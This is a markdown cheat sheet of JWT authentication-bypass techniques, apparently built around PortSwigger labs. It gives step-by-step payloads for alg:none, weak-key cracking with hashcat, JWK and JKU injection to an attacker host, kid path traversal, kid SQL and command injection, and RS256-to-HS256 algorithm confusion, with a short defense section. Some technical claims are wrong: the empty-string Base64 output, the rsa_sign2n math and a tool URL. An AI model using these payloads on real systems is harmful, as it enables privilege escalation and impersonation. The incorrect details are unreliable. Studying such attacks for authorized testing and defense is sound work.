# 🔐 JWT Authentication Bypass - Complete Notes

## ⚠️ CRITICAL NOTE - Admin Panel Access

**🎯 IMPORTANT:** For admin panel access, always change the URL from:

```
❌ /myaccount?username=<name>
✅ /admin
```

**Otherwise it will NOT work!**

---

## 📑 Table of Contents

1. JWT Authentication Bypass via Unverified Signature
2. JWT Authentication Bypass via Flawed Signature Verification
3. JWT Authentication Bypass via Weak Signing Key
4. JWT Authentication Bypass via JWK Header Injection
5. JWT Authentication Bypass via JKU Header Injection
6. JWT Authentication Bypass via KID Header Path Traversal

---

## 📚 JWT Structure Overview

```
JWT Token = Header.Payload.Signature

🔸 Header:    {"alg": "HS256", "typ": "JWT"}
🔸 Payload:   {"sub": "user123", "name": "John", "admin": false}
🔸 Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

---

## 1️⃣ JWT Authentication Bypass via Unverified Signature

### 📌 Concept

Website does **NOT** check the JWT signature strictly. You can modify the payload (username, roles, etc.) without invalidating the token.

### 🔍 Why This Works

- Server accepts JWT tokens without verifying signature
- Only decodes and reads the payload data
- No cryptographic validation performed

### 🛠️ Testing Steps

**Step 1:** Send request to Burp Repeater

```
🔸 Intercept the request containing JWT token
🔸 Right-click → Send to Repeater
```

**Step 2:** Edit the JWT payload

```json
Original Payload:
{
  "sub": "wiener",
  "name": "Peter Wiener",
  "admin": false
}

Modified Payload:
{
  "sub": "administrator",
  "name": "Administrator",
  "admin": true
}
```

**Step 3:** Send the modified request

```
✅ Hit "Send" button
💥 Access granted as administrator!
```

### 💡 Key Points

- ⚠️ No signature verification needed
- 🎯 Simply change username to `administrator`
- 🔓 Instant admin access

---

## 2️⃣ JWT Authentication Bypass via Flawed Signature Verification

### 📌 Concept

Change the algorithm to **`none`** so the server skips signature verification entirely. This exploits weak algorithm validation.

### 🔍 Why This Works

- Server accepts `alg: none` algorithm
- When algorithm is "none", no signature is required
- Server doesn't enforce algorithm restrictions

### 🛠️ Testing Steps

**Step 1:** Send request to Repeater

```
🔸 Intercept JWT request
🔸 Send to Repeater
```

**Step 2:** Modify JWT Header

```json
Original Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Modified Header:
{
  "alg": "none",
  "typ": "JWT"
}
```

**Step 3:** Modify Payload (if needed)

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 4:** Remove signature

```
Original: eyJhbGc...header.eyJzdWI...payload.signature_here
Modified: eyJhbGc...header.eyJzdWI...payload.
                                              ↑ (remove signature, keep the dot)
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Bypassed authentication!
```

### 💡 Key Points

- 🔸 Algorithm changed to `none`
- 🔸 Signature part can be empty
- ⚠️ Keep the trailing dot (.)

---

## 3️⃣ JWT Authentication Bypass via Weak Signing Key

### 📌 Concept

If website uses **symmetric cryptography** (like HS256) with a weak secret key, we can brute-force it using **Hashcat** and forge valid tokens.

### 🔍 Why This Works

- Weak passwords used as signing keys
- HS256 uses same key for signing & verification
- Dictionary/brute-force attacks can crack weak keys

### 🛠️ Testing Steps

**Step 1:** Send request to Repeater

```
🔸 Capture request with JWT token
🔸 Copy the complete JWT token
```

**Step 2:** Brute-force with Hashcat

```bash
# Command structure
hashcat -a 0 -m 16500 "<jwt_token>" /path/to/wordlist.txt

# Example
hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature" rockyou.txt
```

**🔸 Parameters Explained:**

- `-a 0` → Dictionary attack mode
- `-m 16500` → JWT (HS256) hash mode
- `<jwt_token>` → Your captured JWT
- `wordlist.txt` → Password dictionary file

**Step 3:** Extract the cracked key

```bash
# Hashcat output example:
eyJhbGc...token...:secret123

🎯 Found key: secret123
```

**Step 4:** Encode key in Base64

```
🔸 Go to Burp → Decoder tab
🔸 Enter: secret123
🔸 Encode as: Base64
🔸 Result: c2VjcmV0MTIz
📋 Copy this encoded value
```

**Step 5:** Create new Symmetric Key in JWT Editor

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New Symmetric Key"
🔸 Replace the "k" parameter value with encoded key: c2VjcmV0MTIz
🔸 Click "Generate"
```

**Step 6:** Modify and Sign JWT

```
🔸 Go to request in Repeater
🔸 Modify payload (change username to "administrator")
🔸 Go to "JSON Web Token" tab at bottom
🔸 Click "Sign" button
🔸 Select: "Don't modify header"
🔸 Click "OK"
```

**Step 7:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel access granted!
```

### 💡 Key Points

- 🔐 Only works with symmetric algorithms (HS256, HS384, HS512)
- 🔑 Requires weak/common passwords
- ⚡ Hashcat is fastest for cracking
- 📝 Always Base64 encode the secret before using

---

## 4️⃣ JWT Authentication Bypass via JWK Header Injection

### 📌 Concept

Exploit **asymmetric cryptography** (RS256) by injecting our own **JWK (JSON Web Key)** in the header. Server uses embedded key instead of its own.

### 🔍 Why This Works

- Server accepts JWK from token header
- Uses embedded public key for verification
- No validation of key origin

### 🛠️ Testing Steps

**Step 1:** Modify username in payload

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 2:** Generate RSA Key Pair

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New RSA Key"
🔸 Key Size: 2048 bits
🔸 Click "Generate"
🔸 Save the key
```

**Step 3:** Attack with Embedded JWK

```
🔸 Go to request in Repeater
🔸 Go to "JSON Web Token" tab
🔸 Click "Attack" dropdown
🔸 Select "Embedded JWK"
🔸 Select your generated RSA key
🔸 Click "OK"
```

**Step 4:** Send request

```
✅ Hit "Send"
💥 Admin panel unlocked!
```

### 💡 What Happens Behind the Scenes

```json
Header before attack:
{
  "alg": "RS256",
  "typ": "JWT"
}

Header after attack:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "your-key-id",
    "n": "your-public-key-modulus..."
  }
}
```

### 💡 Key Points

- 🔐 Works with asymmetric algorithms (RS256, RS384, RS512)
- 🔑 We control both private & public key
- 🎯 Server trusts embedded JWK without validation

---

## 5️⃣ JWT Authentication Bypass via JKU Header Injection

### 📌 Concept

Inject **JKU (JSON Web Key URL)** header pointing to attacker-controlled server hosting malicious public keys.

### 🔍 Why This Works

- Server fetches public keys from JKU URL
- No validation of URL origin
- Attacker can host their own key set

### 🛠️ Testing Steps

**Step 1:** Create new RSA Key

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New RSA Key"
🔸 Generate key
🔸 Copy the public key (JWK format)
```

**Step 2:** Setup Exploit Server

```
🔸 Go to Exploit Server
🔸 In Body section, add:
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "your-generated-kid",
      "n": "your-public-key-modulus..."
    }
  ]
}
```

```
🔸 Save and note the URL
```

**Step 3:** Modify JWT Token

```
🔸 Go to Repeater
🔸 Modify payload (username → administrator)
🔸 In JSON Web Token tab, modify header:
```

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "your-generated-kid",
  "jku": "https://exploit-server.com/exploit"
}
```

**Step 4:** Sign the token

```
🔸 Click "Sign" button
🔸 Select your RSA key
🔸 Don't modify header
🔸 Click "OK"
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel access!
```

### 💡 Key Points

- 🌐 JKU = URL pointing to JSON Web Key Set
- 🔑 Server fetches keys from attacker's URL
- 🎯 Kid parameter links token to specific key

---

## 6️⃣ JWT Authentication Bypass via KID Header Path Traversal

### 📌 Concept

Exploit **path traversal** in `kid` (Key ID) parameter to point to predictable file (like `/dev/null`) and use empty string as signing key.

### 🔍 Why This Works

- Kid parameter vulnerable to directory traversal
- `/dev/null` is an empty file on Linux
- Empty string can be used as symmetric key
- Only works with **symmetric algorithms**

### 🛠️ Testing Steps

**Step 1:** Modify JWT Header

```json
Original:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "some-key-id"
}

Modified:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

**Step 2:** Modify Payload

```json
{
  "sub": "administrator",
  "name": "Administrator"
}
```

**Step 3:** Create Symmetric Key with empty secret

```
🔸 Burp → JWT Editor Keys tab
🔸 Click "New Symmetric Key"
🔸 Find the "k" parameter
🔸 Replace value with: AA==
   (This is Base64 of empty string/null byte)
🔸 Save the key
```

**Step 4:** Sign the token

```
🔸 Go to JSON Web Token tab
🔸 Click "Sign"
🔸 Select your symmetric key (with AA==)
🔸 Don't modify header
🔸 Click "OK"
```

**Step 5:** Send request

```
✅ Hit "Send"
💥 Boom! Admin panel granted!
```

### 💡 Path Traversal Alternatives

```
Try these kid values:
🔸 ../../../../../../../dev/null
🔸 ../../../../../../dev/null
🔸 /dev/null
🔸 ../../../../etc/passwd (if you know key location)
```

### 💡 Key Points

- 🔓 Only works with symmetric algorithms (HS256)
- 📁 Exploits file system access
- 🔑 Empty string (AA==) is Base64 of null byte
- ⚠️ Number of `../` may vary based on directory depth

---

## 🔄 Algorithm Confusion Attacks

### 🧠 Concept

**Algorithm Confusion** occurs when:

1. Server accepts multiple algorithms (RS256, HS256)
2. Attacker changes `RS256` (asymmetric) to `HS256` (symmetric)
3. Server uses **public key** as **HMAC secret** to verify signature
4. Attacker signs token with the public key (which is... public!)

### 📊 Attack Flow Diagram

```
Normal Flow (RS256):
Server has: Private Key (secret) + Public Key (public)
Token signed with: Private Key
Token verified with: Public Key ✅

Attack Flow (RS256 → HS256):
Attacker has: Public Key (obtained from server)
Token "signed" with: Public Key (as HMAC secret)
Server verifies with: Public Key (as HMAC secret) ✅ BYPASSED!
```

### ⚡ Why This Works

```
RS256 Verification:
verify_signature(public_key, token) ✅

HS256 Verification (Confused):
verify_signature(public_key_as_secret, token) ✅
The server uses the PUBLIC KEY as the HMAC secret!
```

---

## 7.  JWT Bypass with Exposed Key

### 🎯 Attack Scenario

Website trusts the algorithm parameter blindly and exposes the public key via `/jwks.json` endpoint.

### 🛠️ Step-by-Step Attack

#### ✅ Step 1: Capture the JWT Request

```http
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Action:** Send this request to Burp Repeater

#### ✅ Step 2: Find the Public Key

```http
GET /.well-known/jwks.json HTTP/1.1
Host: target.com
```

**Common endpoints to try:**

- `/.well-known/jwks.json`
- `/jwks.json`
- `/.well-known/openid-configuration`
- `/api/jwks.json`
- `/oauth/discovery/keys`

**Example Response:**

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "1234",
      "alg": "RS256",
      "n": "xGOr-H7A3T..."
    }
  ]
}
```

#### ✅ Step 3: Copy the JWK

```json
// Copy ONLY the object inside the array:
{
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "1234",
  "alg": "RS256",
  "n": "xGOr-H7A3T..."
}
```

#### ✅ Step 4: Import to JWT Editor (Burp)

**In Burp Suite:**

1. Go to **JWT Editor** tab (Burp Extension)
2. Click **New RSA Key**
3. Paste the copied JWK
4. Click **OK**

![JWT Editor Import](https://claude.ai/chat/b5f5e04c-4232-4296-b9cd-1ad442cc420d)

#### ✅ Step 5: Convert Public Key to PEM Format

**In JWT Editor:**

1. Right-click on the generated key
2. Select **Copy Public Key as PEM**

**PEM Format Example:**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxGOr+H7A3T...
-----END PUBLIC KEY-----
```

#### ✅ Step 6: Base64 Encode the Public Key

**In Burp Decoder:**

1. Paste the PEM public key
2. Select **Encode as → Base64**

**Result:**

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR...
```

#### ✅ Step 7: Create Symmetric Key

**In JWT Editor:**

1. Click **New Symmetric Key**
2. Click **Generate**
3. You'll get a key like:

```json
{
  "kty": "oct",
  "kid": "symmetric-key",
  "k": "random_base64_string_here"
}
```

4. **Replace** the `"k"` value with your Base64-encoded public key:

```json
{
  "kty": "oct",
  "kid": "symmetric-key",
  "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR..."
}
```

#### ✅ Step 8: Modify the JWT Token

**Original JWT Header:**

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**Modified JWT Header:**

```json
{
  "alg": "HS256",  // Changed from RS256
  "typ": "JWT"
}
```

**Original JWT Payload:**

```json
{
  "sub": "wiener",
  "exp": 1516239022
}
```

**Modified JWT Payload:**

```json
{
  "sub": "administrator",  // Changed to admin
  "exp": 1516239022
}
```

#### ✅ Step 9: Sign the Token

**In Burp JWT Editor:**

1. Click **Sign** button
2. Select your **Symmetric Key** (the one with public key as "k")
3. Choose **Don't modify header**
4. Click **OK**

**Result:** New JWT token signed with HS256 using the public key as secret!

#### ✅ Step 10: Send the Request

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNTE2MjM5MDIyfQ.NEW_SIGNATURE_HERE
```

**Expected Result:** 🎉 Access to admin panel!

### 🎬 Visual Walkthrough

```
1. Capture Request with JWT
   ↓
2. Find /jwks.json endpoint
   ↓
3. Copy JWK (public key)
   ↓
4. Import to JWT Editor
   ↓
5. Export as PEM format
   ↓
6. Base64 encode PEM
   ↓
7. Create Symmetric Key with encoded PEM as "k"
   ↓
8. Modify JWT (RS256→HS256, user→admin)
   ↓
9. Sign with Symmetric Key
   ↓
10. Send request → Admin Access! 🎯
```

---

##  8. JWT Bypass without Exposed Key

### 🎯 Attack Scenario

Website trusts the algorithm parameter but does **NOT** expose the JWK publicly. We need to **derive the public key** from existing JWT tokens.

### 🧰 Required Tool: rsa_sign2n

#### 📥 Installation

```bash
# Clone the repository
git clone https://github.com/silentsignal/rsa_sign2n.git
cd rsa_sign2n

# Install dependencies
sudo apt install python3 python3-pip
pip3 install gmpy2
```

### 🛠️ Step-by-Step Attack

#### ✅ Step 1: Capture Multiple JWT Tokens

```http
# Collect at least 2 different JWT tokens
Token 1: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.SIGNATURE1
Token 2: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMiJ9.SIGNATURE2
```

**Action:** Send request to Burp Repeater

#### ✅ Step 2: Extract Public Key Using rsa_sign2n

```bash
# Run the tool with two JWT tokens
python3 standalone.py <JWT_TOKEN_1> <JWT_TOKEN_2>
```

**Example:**

```bash
python3 standalone.py \
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.abc123... \
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMiJ9.def456...
```

**Output:** Tool generates multiple possible public keys

```
Tampered JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Tampered JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Tampered JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Files Created:**

- `x509_key_1.pem`
- `x509_key_2.pem`
- `x509_key_3.pem`
- ... (multiple candidates)

#### ✅ Step 3: Test Each Public Key

**Why test first?** Not all generated keys will work. We need to find the correct one.

**Test Process:**

```http
# For each generated token from rsa_sign2n
GET /my-account HTTP/1.1
Host: target.com
Cookie: session=<GENERATED_JWT_TOKEN>
```

**Indicators of correct key:**

- ✅ 200 OK response (not 401 Unauthorized)
- ✅ User data loads correctly
- ✅ No "Invalid signature" error

**Burp Intruder Method:**

1. Send request to Intruder
2. Mark JWT token as payload position
3. Load all generated tokens as payload list
4. Look for 200 responses

#### ✅ Step 4: Extract the Working Public Key

**Once you find the working token:**

```bash
# Check which key file corresponds to the working token
# Usually the tool outputs: "Key X worked"

# View the public key
cat x509_key_3.pem
```

**Example Output:**

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxGOr+H7A3T...
uI5Xyl9H8mQ5E7K8vRNqT2Jd1F3w/xPQ+5D8K...
-----END PUBLIC KEY-----
```

#### ✅ Step 5: Base64 Encode the Public Key

**Copy the entire PEM content and encode:**

```bash
# Command line method
cat x509_key_3.pem | base64 -w 0

# Or use Burp Decoder
```

**Result:**

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR...
```

#### ✅ Step 6: Create Symmetric Key in JWT Editor

**In Burp JWT Editor:**

1. Click **New Symmetric Key**
2. Click **Generate**
3. Replace the `"k"` value with Base64-encoded public key:

```json
{
  "kty": "oct",
  "kid": "derived-key",
  "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR..."
}
```

#### ✅ Step 7: Modify JWT Token

**Change Algorithm:**

```json
{
  "alg": "HS256",  // Changed from RS256
  "typ": "JWT"
}
```

**Change Payload:**

```json
{
  "sub": "administrator",  // Privilege escalation
  "exp": 1516239022
}
```

#### ✅ Step 8: Sign the Token

1. Click **Sign** button
2. Select your Symmetric Key (with derived public key)
3. Choose **Don't modify header**
4. Click **OK**

#### ✅ Step 9: Access Admin Panel

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=<NEWLY_SIGNED_JWT>
```

**Success:** 🎉 Administrator access achieved!

### 🎬 Complete Attack Flow

```
1. Capture JWT Request (Regular User)
   ↓
2. Collect 2+ Different JWT Tokens
   ↓
3. Run rsa_sign2n Tool
   python3 standalone.py <token1> <token2>
   ↓
4. Tool Generates Multiple Public Key Candidates
   (x509_key_1.pem, x509_key_2.pem, etc.)
   ↓
5. Test Each Generated Token
   (Use Burp Intruder for speed)
   ↓
6. Identify Working Key File
   (Token that returns 200 OK)
   ↓
7. Extract and Base64 Encode Public Key
   cat x509_key_X.pem | base64
   ↓
8. Create Symmetric Key in JWT Editor
   (Use Base64 key as "k" value)
   ↓
9. Modify JWT (RS256→HS256, user→admin)
   ↓
10. Sign with Symmetric Key
    ↓
11. Send Request → Admin Access! 🎯
```

### 🔬 Why rsa_sign2n Works

**Mathematical Background:**

```
RSA relies on the difficulty of factoring large numbers.
When you have TWO different signatures from the same key:
- Signature 1: s₁ = m₁^d mod n
- Signature 2: s₂ = m₂^d mod n

The tool can compute:
gcd(s₁^e - m₁, s₂^e - m₂) 

This may reveal factors of n (the public modulus)
→ Allows reconstruction of the public key!
```

---

## 🛠️ Tools & Setup

### 🎯 Essential Tools

#### 1. Burp Suite Professional

**JWT Editor Extension**

```
1. Burp → Extender → BApp Store
2. Search "JWT Editor"
3. Install
4. New tab "JWT Editor Keys" appears
```

**Features:**

- ✅ View/Edit JWT tokens
- ✅ Import RSA/Symmetric keys
- ✅ Sign tokens
- ✅ Attack automation

#### 2. rsa_sign2n Tool

```bash
# Installation
git clone https://github.com/silentsignal/rsa_sign2n.git
cd rsa_sign2n
pip3 install gmpy2

# Usage
python3 standalone.py <JWT1> <JWT2>
```

**Purpose:** Derive public keys from JWT signatures

#### 3. jwt_tool

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
chmod +x jwt_tool.py

# Usage
python3 jwt_tool.py <JWT_TOKEN>
```

**Features:**

- 🔍 JWT scanning
- 🎯 Automated attacks
- 🔑 Key bruteforcing
- 📝 Token manipulation

#### 4. jwt.io (Online Debugger)

**Website:** https://jwt.io

**Features:**

- ✅ Decode JWT tokens
- ✅ Visual editor
- ✅ Signature verification
- ⚠️ Don't paste sensitive tokens!

#### 5. CyberChef

**Website:** https://gchef.org

**Uses:**

- Base64 encoding/decoding
- PEM format conversion
- Quick data manipulation

### 🔧 Burp Suite Configuration

#### JWT Editor Setup

```
1. JWT Editor Keys Tab
   ├─ New RSA Key (for RS256 keys)
   ├─ New Symmetric Key (for HS256 keys)
   └─ Import keys from various formats

2. In Repeater/Proxy
   ├─ JWT tokens automatically detected
   ├─ Visual editor appears
   └─ Sign button for quick signing
```

#### Useful Burp Extensions

```
- JWT Editor
- JSON Web Tokens
- Auth Analyzer
- Autorize
- Token Extractor
```

---

## 🎯 Attack Methodology

### 📝 Complete Testing Workflow

#### Phase 1: Reconnaissance 🔍

**1. Identify JWT Usage**

```http
# Check cookies
Cookie: session=eyJ...

# Check headers
Authorization: Bearer eyJ...

# Check URL parameters
?token=eyJ...

# Check POST body
{"token": "eyJ..."}
```

**2. Decode the JWT**

```bash
# Using jwt_tool
python3 jwt_tool.py <JWT>

# Or manually (Base64 decode)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

**3. Identify Algorithm**

```json
{
  "alg": "HS256",  // HMAC (Symmetric)
  "alg": "RS256",  // RSA (Asymmetric)
  "alg": "ES256",  // ECDSA (Asymmetric)
  "alg": "none"    // No signature
}
```

**4. Map Endpoints**

```
GET /jwks.json
GET /.well-known/jwks.json
GET /.well-known/openid-configuration
GET /api/jwks.json
GET /oauth/discovery/keys
GET /.well-known/jwks
GET /openid/connect/jwks.json
```

#### Phase 2: Vulnerability Detection ⚠️

**Test 1: None Algorithm**

```json
// Change header
{"alg": "none", "typ": "JWT"}

// Remove signature (keep dots)
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

**Test 2: Algorithm Confusion (RS256 → HS256)**

```json
// If public key accessible
1. Get public key
2. Change alg to HS256
3. Sign with public key as HMAC secret
```

**Test 3: Weak Secret Bruteforce**

```bash
# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt
```

**Test 4: Key ID (kid) Injection**

```json
{
  "alg": "HS256",
  "kid": "/etc/passwd"  // Path traversal
}

{
  "alg": "HS256",
  "kid": "../../dev/null"  // Sign with empty secret
}
```

**Test 5: JKU Header Injection**

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"  // Remote key fetch
}
```

#### Phase 3: Exploitation 💥

**Attack Path Decision Tree:**

```
Is public key exposed?
├─ YES → Use Algorithm Confusion (Exposed Key)
│  └─ Follow 10-step process
│
└─ NO → Can you get multiple tokens?
   ├─ YES → Use rsa_sign2n (No Exposed Key)
   │  └─ Derive public key from signatures
   │
   └─ NO → Try other attacks:
      ├─ None algorithm
      ├─ Weak secret bruteforce
      ├─ kid injection
      └─ jku injection
```

#### Phase 4: Post-Exploitation 🎯

**1. Privilege Escalation**

```json
// Change role
{"role": "admin"}
{"admin": true}
{"isAdmin": true}
{"permissions": ["admin", "superuser"]}
```

**2. User Impersonation**

```json
// Change user ID
{"sub": "administrator"}
{"user_id": 1}
{"username": "admin"}
```

**3. Extend Token Lifetime**

```json
// Change expiration
{"exp": 9999999999}  // Far future
```

**4. Access Restricted Resources**

```http
GET /admin HTTP/1.1
GET /api/admin/users HTTP/1.1
DELETE /api/users/victim HTTP/1.1
```

---

#### SQL Injection in kid

```json
{
  "alg": "HS256",
  "kid": "key' UNION SELECT 'secret'--"
}

// If server queries: SELECT key FROM keys WHERE id='$kid'
// Becomes: SELECT key FROM keys WHERE id='key' UNION SELECT 'secret'--'
// You control the secret!
```

#### Command Injection

```json
{
  "alg": "HS256",
  "kid": "key; echo 'secret' > /tmp/key"
}

// If server uses: system("cat /keys/$kid")
// Command injection possible!
```

---

## 🛡️ Defense & Mitigation

### ✅ Secure Implementation Best Practices

#### 1. Algorithm Whitelisting

```javascript
// BAD - Accepts any algorithm
jwt.verify(token, secret);

// GOOD - Specify allowed algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] });

//
```

## 🔐 JWT Algorithms Comparison

|Algorithm|Type|Key Type|Attack Vector|
|---|---|---|---|
|**HS256**|Symmetric|Single Secret|Weak key brute-force, KID traversal|
|**RS256**|Asymmetric|Public/Private|JWK injection, JKU injection|
|**none**|None|No key|Algorithm confusion|

---

## 🛡️ Prevention Measures

|❌ Vulnerability|✅ Fix|
|---|---|
|Unverified signature|Always verify JWT signature|
|Algorithm confusion|Reject `alg: none`, whitelist allowed algorithms|
|Weak signing key|Use strong, random keys (256+ bits)|
|JWK injection|Never trust embedded JWK from token|
|JKU injection|Whitelist trusted JKU domains only|
|KID traversal|Validate & sanitize KID parameter, no file system access|

---

## 🔧 Essential Tools

**🦊 Burp Suite Extensions:**

- JWT Editor
- JSON Web Tokens
- JWT Attacker

**⚡ Command Line Tools:**

- Hashcat (key cracking)
- jwt_tool (Python)
- John the Ripper

**📝 Online Resources:**

- jwt.io (decode/verify tokens)
- Base64 encoder/decoder

---

## 📚 Quick Reference Commands

### Hashcat JWT Cracking

```bash
# Basic syntax
hashcat -a 0 -m 16500 "<jwt_token>" wordlist.txt

# With rules
hashcat -a 0 -m 16500 "<jwt_token>" wordlist.txt -r rules/best64.rule

# Resume session
hashcat --session jwt_crack --restore
```

### Base64 Encoding (Linux/Mac)

```bash
# Encode
echo -n "secret123" | base64

# Decode
echo "c2VjcmV0MTIz" | base64 -d

# Empty string (null byte)
echo -n "" | base64
# Output: AA==
```

### cURL JWT Request

```bash
curl -H "Authorization: Bearer <jwt_token>" https://target.com/admin
```

---

## 🎯 Testing Checklist

- [ ] Check if signature is verified
- [ ] Test `alg: none` bypass
- [ ] Attempt weak key brute-force (if HS256)
- [ ] Try JWK header injection (if RS256)
- [ ] Test JKU header injection
- [ ] Check KID parameter for path traversal
- [ ] Modify payload claims (username, roles, admin)
- [ ] Test with different algorithms
- [ ] Check token expiration enforcement
- [ ] Verify audience (aud) claim validation

---

## ⚠️ Ethical Reminder

**🚨 IMPORTANT:** Only test on authorized systems!

- ✅ Use on CTF challenges (HackTheBox, PortSwigger Labs)
- ✅ Test on your own applications
- ✅ Conduct authorized penetration tests
- ❌ **NEVER** test on systems without permission
- ❌ Unauthorized testing is **illegal**

**📜 Always get written authorization before testing!**

---

## 💡 Pro Tips

1. **🔍 Always decode JWT first** - Use jwt.io to understand structure
2. **📋 Copy tokens carefully** - Include entire token with all dots
3. **🎯 Check algorithm** - Different attacks for symmetric vs asymmetric
4. **⚡ Use Burp extensions** - JWT Editor makes attacks easier
5. **🔑 Save cracked keys** - Build a database of common secrets
6. **🧪 Test systematically** - Follow checklist order
7. **📝 Document findings** - Screenshot each successful step

---

## 🔗 Additional Resources

**📚 Learning Platforms:**

- PortSwigger Web Security Academy (JWT Labs)
- HackTheBox (JWT Challenges)
- TryHackMe (JWT Rooms)

**📖 Documentation:**

- RFC 7519 - JSON Web Token (JWT)
- OWASP JWT Cheat Sheet
- Auth0 JWT Handbook

---

**📝 Created for Security Testing & Learning**  
**🗓️ Last Updated: 2025**

---

**💬 Happy Hacking! (Ethically) 🔐**